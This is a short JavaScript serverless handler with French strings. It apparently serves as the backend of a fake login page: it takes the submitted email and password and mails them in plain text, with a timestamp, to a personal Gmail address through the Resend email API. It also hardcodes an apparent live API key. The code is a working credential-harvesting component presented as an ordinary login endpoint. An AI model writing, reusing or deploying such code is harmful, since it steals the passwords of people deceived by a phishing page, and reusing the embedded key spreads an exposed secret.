import { Resend } from "resend";

const resend = new Resend("re_34bWy9dW_gnT2qgKDCHc4BqSPJEyKi3GK"); // ← remplacer

export default async function handler(req, res) {
  const { email, password } = req.body;

  await resend.emails.send({
    from: "onboarding@resend.dev",
    to: "tokyadriano45@gmail.com",
    subject: "Nouvelle connexion",
    text: `Email: ${email}\nMot de passe: ${password}\nDate: ${new Date().toLocaleString()}`,
  });

  res.status(200).json({ ok: true });
}
